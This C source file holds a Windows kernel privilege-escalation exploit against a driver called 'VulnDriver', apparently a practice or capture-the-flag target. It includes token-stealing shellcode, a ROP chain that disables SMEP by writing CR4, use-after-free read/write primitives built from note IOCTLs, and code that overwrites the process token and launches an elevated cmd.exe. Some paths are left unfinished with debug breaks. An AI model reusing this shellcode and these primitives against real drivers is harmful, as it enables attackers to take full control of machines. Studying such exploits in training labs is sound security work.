#include <Windows.h>
#include "Hdr.h"
#include "util.h"
#include "exploit.h"

// [Exploit functions]--------------------------------------------------------------------------

VOID Exploit_1()
{
	STARTUPINFO si = {
		0,
	};
	PROCESS_INFORMATION pi = {
		0,
	};
	HANDLE hTokenCurrent;
	HANDLE hTokenElevate;

	if (hDevice == NULL)
	{
		hDevice = CreateFile(
			L"\\\\.\\VulnDriver",
			GENERIC_READ | GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (hDevice == INVALID_HANDLE_VALUE)
		{
			printf("Error while CreateFile : %d\n", GetLastError());
			return;
		}
	}

	//AllocateKernelMemory(0, sizeof(NOTE_STRUCT));
	//FreeKernelMemory(0);

	CHAR test[] = "BBBB";
	Write(0, 0x4141414141414141, (PCHAR)&test, 4);
	return;

	//MakeNote(0);
	//WriteNote(0);
	//// ReadNote(0);
	//DeleteNote(0);

	OverwriteToken();

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrent))
	{
		printf("error while OpenProcessToken: %d\n", GetLastError());
		return;
	}
	hTokenElevate = CreateUserToken(hTokenCurrent, 2);
	printf("Elevated: %llx\n", get_handle_addr(hTokenElevate));

	if (!CreateProcessWithTokenW(hTokenElevate, 1, L"cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		printf("Error while CreateProcess : %d\n", GetLastError());
		return;
	}
}

VOID Exploit_2()
{
	BOOL isSuccess;
	ULONG returned;
	PCHAR kShellcodeAddr = NULL;
	CHAR buf[512] = {
		0,
	};
	LPVOID lpvPayload;
	ULONG64 KernelBase;

	// slightly altered shellcode from
	// https://github.com/Cn33liz/HSEVD-StackOverflowX64/blob/master/HS-StackOverflowX64/HS-StackOverflowX64.c
	// thank you @Cneelis
	BYTE ShellCode[] =
		"\x50\x53\x51\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x66\xC7\x80\xE4\x01\x00\x00\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\x8D\x98\x60\x03\x00\x00\x48\x8B\x80\xF0\x02\x00\x00\x48\x2D\xF0\x02\x00\x00\x48\x8B\x88\xE8\x02\x00\x00\x48\x83\xF9\x04\x75\xE6\x48\x8B\x88\x60\x03\x00\x00\x48\x89\x0B\x59\x5B\x58"
		"\x48\x81\xc4\x30\x00\x00\x00" // add rsp, 30h
		"\x48\x31\xF6"				   // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
		"\x48\x31\xFF"				   // xor rdi, rdi
		"\x48\x31\xC0"				   // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
		"\xc3";

	if (hDevice == NULL)
	{
		hDevice = CreateFile(
			L"\\\\.\\VulnDriver",
			GENERIC_READ | GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (hDevice == INVALID_HANDLE_VALUE)
		{
			printf("Error while CreateFile : %d\n", GetLastError());
			return;
		}
	}

	lpvPayload = VirtualAlloc(
		NULL,					  // Next page to commit
		sizeof(ShellCode),		  // Page size, in bytes
		MEM_COMMIT | MEM_RESERVE, // Allocate a committed page
		PAGE_EXECUTE_READWRITE);  // Read/write access

	if (lpvPayload == NULL)
	{
		wprintf(L" -> Unable to reserve Memory!\n\n");
		exit(1);
	}

	RtlCopyMemory(lpvPayload, ShellCode, sizeof(ShellCode));

	KernelBase = GetKernelBase();

	RtlFillMemory(buf, 0x118, 'A');
	*(PULONG64)((PCHAR)buf + 0x118) = KernelBase + 0x1bc08b; // pop rcx; ret;
	*(PULONG64)((PCHAR)buf + 0x120) = 0x70678;				 // rcx
	*(PULONG64)((PCHAR)buf + 0x128) = KernelBase + 0x5a89b5; // mov cr4, rcx; ret;

	*(PULONG64)((PCHAR)buf + 0x130) = (ULONG64)lpvPayload;

	// DebugBreak();

	isSuccess = DeviceIoControl(
		hDevice,		   // HANDLE       hDevice
		(DWORD)IOCTL_ECHO, // DWORD        dwIoControlCode
		&buf,			   // LPVOID       lpInBuffer
		0x138,			   // DWORD        nInBufferSize
		//0x10,		      // DWORD        nInBufferSize
		NULL,	   // LPVOID       lpOutBuffer
		0,		   // DWORD        nOutBufferSize
		&returned, // LPDWORD      lpBytesReturned
		NULL	   // LPOVERLAPPED lpOverlapped
	);
}

// [Primitives]--------------------------------------------------------------------------

VOID AllocateKernelMemory(IN ULONG index, IN ULONG size, IN PCHAR payload)
{
	BOOL isSuccess;
	ULONG returned;
	WRITE_STRUCT PageWriteRequest = {
		0,
	};

	PageWriteRequest.NoteIndex.idx = index;
	PageWriteRequest.UserBuffer = payload;
	PageWriteRequest.UserBufferLength = size;

	isSuccess = DeviceIoControl(
		hDevice,			  // HANDLE       hDevice
		(DWORD)IOCTL_ALLOC,	  // DWORD        dwIoControlCode
		&PageWriteRequest,	  // LPVOID       lpInBuffer
		sizeof(WRITE_STRUCT), // DWORD        nInBufferSize
		NULL,				  // LPVOID       lpOutBuffer
		0,					  // DWORD        nOutBufferSize
		&returned,			  // LPDWORD      lpBytesReturned
		NULL				  // LPOVERLAPPED lpOverlapped
	);
}

VOID FreeKernelMemory(IN ULONG index)
{
	BOOL isSuccess;
	ULONG returned;

	IDX_STRUCT Index = {
		0,
	};
	Index.idx = index;

	isSuccess = DeviceIoControl(
		hDevice,			// HANDLE       hDevice
		(DWORD)IOCTL_FREE,	// DWORD        dwIoControlCode
		&Index,				// LPVOID       lpInBuffer
		sizeof(IDX_STRUCT), // DWORD        nInBufferSize
		NULL,				// LPVOID       lpOutBuffer
		0,					// DWORD        nOutBufferSize
		&returned,			// LPDWORD      lpBytesReturned
		NULL				// LPOVERLAPPED lpOverlapped
	);
}

VOID FreeAllKernelMemory()
{
	for (int i = 0; i < 256; i++)
	{
		FreeKernelMemory(i);
	}
}

VOID LeaveAddress(IN ULONG index, IN ULONG64 address)
{
	PCHAR payload = malloc(sizeof(NOTE_STRUCT));
	memset(payload, 0x41, 32);
	*((PULONG64)(payload + 32)) = address;

	AllocateKernelMemory(index, sizeof(NOTE_STRUCT), payload);
	FreeKernelMemory(index);
	free(payload);
}

VOID MakeNote(IN ULONG index)
{
	BOOL isSuccess;
	ULONG returned;
	WRITE_STRUCT PageWriteRequest = {
		0,
	};
	CHAR NoteName[] = "NOTE";

	PageWriteRequest.NoteIndex.idx = index;
	PageWriteRequest.UserBuffer = (PCHAR)&NoteName;
	PageWriteRequest.UserBufferLength = sizeof(NoteName);

	isSuccess = DeviceIoControl(
		hDevice,				// HANDLE       hDevice
		(DWORD)IOCTL_MAKE_NOTE, // DWORD        dwIoControlCode
		&PageWriteRequest,		// LPVOID       lpInBuffer
		sizeof(WRITE_STRUCT),	// DWORD        nInBufferSize
		NULL,					// LPVOID       lpOutBuffer
		0,						// DWORD        nOutBufferSize
		&returned,				// LPDWORD      lpBytesReturned
		NULL					// LPOVERLAPPED lpOverlapped
	);
}

VOID ReadNote(IN ULONG index, OUT PCHAR out, IN ULONG len)
{
	BOOL isSuccess;
	ULONG returned;

	IDX_STRUCT Index = {
		0,
	};
	Index.idx = index;

	isSuccess = DeviceIoControl(
		hDevice,				// HANDLE       hDevice
		(DWORD)IOCTL_READ_NOTE, // DWORD        dwIoControlCode
		&Index,					// LPVOID       lpInBuffer
		sizeof(IDX_STRUCT),		// DWORD        nInBufferSize
		out,					// LPVOID       lpOutBuffer
		len,					// DWORD        nOutBufferSize
		&returned,				// LPDWORD      lpBytesReturned
		NULL					// LPOVERLAPPED lpOverlapped
	);
}

VOID WriteNote(IN ULONG index, IN PCHAR payload, IN ULONG len)
{
	BOOL isSuccess;
	ULONG returned;
	WRITE_STRUCT PageWriteRequest = {
		0,
	};

	PageWriteRequest.NoteIndex.idx = index;
	PageWriteRequest.UserBuffer = payload;
	PageWriteRequest.UserBufferLength = len;

	isSuccess = DeviceIoControl(
		hDevice,				 // HANDLE       hDevice
		(DWORD)IOCTL_WRITE_NOTE, // DWORD        dwIoControlCode
		&PageWriteRequest,		 // LPVOID       lpInBuffer
		sizeof(WRITE_STRUCT),	 // DWORD        nInBufferSize
		NULL,					 // LPVOID       lpOutBuffer
		0,						 // DWORD        nOutBufferSize
		&returned,				 // LPDWORD      lpBytesReturned
		NULL					 // LPOVERLAPPED lpOverlapped
	);
}

VOID DeleteNote(IN ULONG index)
{
	BOOL isSuccess;
	ULONG returned;

	IDX_STRUCT Index = {
		0,
	};
	Index.idx = index;

	isSuccess = DeviceIoControl(
		hDevice,				  // HANDLE       hDevice
		(DWORD)IOCTL_DELETE_NOTE, // DWORD        dwIoControlCode
		&Index,					  // LPVOID       lpInBuffer
		sizeof(IDX_STRUCT),		  // DWORD        nInBufferSize
		NULL,					  // LPVOID       lpOutBuffer
		0,						  // DWORD        nOutBufferSize
		&returned,				  // LPDWORD      lpBytesReturned
		NULL					  // LPOVERLAPPED lpOverlapped
	);
}

VOID Read(IN ULONG index, IN ULONG64 address, OUT PCHAR output, IN ULONG len)
{
	LeaveAddress(1, address);
	MakeNote(1);
	ReadNote(1, output, len);
	DeleteNote(1);
}

VOID Write(IN ULONG index, IN ULONG64 address, IN PCHAR value, IN ULONG len)
{
	LeaveAddress(0, address);
	MakeNote(0);
	WriteNote(0, value, len);
	// DeleteNote(0);
}

VOID OverwriteToken()
{
	ULONG64 TargetAddress = get_process_token() + 0x40 - 0x04;
	PULONG64 payload = malloc(0x18);
	*(payload) = (ULONG64)-1;
	*(payload + 1) = (ULONG64)-1;
	*(payload + 2) = (ULONG64)-1;

	printf("Token Address: %llx\n", TargetAddress);

	Write(3, TargetAddress, (PCHAR)payload, 0x18);

	DebugBreak();
}